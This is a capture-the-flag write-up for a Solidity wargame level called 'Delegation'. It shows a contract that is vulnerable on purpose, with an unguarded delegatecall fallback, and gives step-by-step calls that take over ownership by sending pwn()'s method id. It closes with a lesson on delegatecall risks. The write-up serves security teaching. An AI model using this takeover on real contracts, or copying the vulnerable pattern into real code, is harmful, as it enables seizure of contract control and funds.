# Delegation  
_difficulty 4/10_

The goal of this level is for you claim ownership of the instance you are given.  
Things that might help  
- Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
- Fallback methods
- Method ids

## Sources
```javascript
pragma solidity ^0.4.18;

contract Delegate {

  address public owner;

  function Delegate(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  function Delegation(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function() public {
    if(delegate.delegatecall(msg.data)) {
      this;
    }
  }
}
```

## Solution

1. Calculate function `pwn()` signature  
`web3.sha3("pwn()").substring(0, 10)`  
"0xdd365b8b"

2. Invoke function to transfer ownership
```javascript
await contract.sendTransaction({
  from: player,
  data: "0xdd365b8b"
})
```

3. Check contract owner  
`player === await contract.owner()`  
true  

4. Submit Instance ðŸŽ‰

## Lesson

Usage of `delegatecall` is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The `delegatecall` function is a powerful feature, but a dangerous one, and must be used with extreme care.
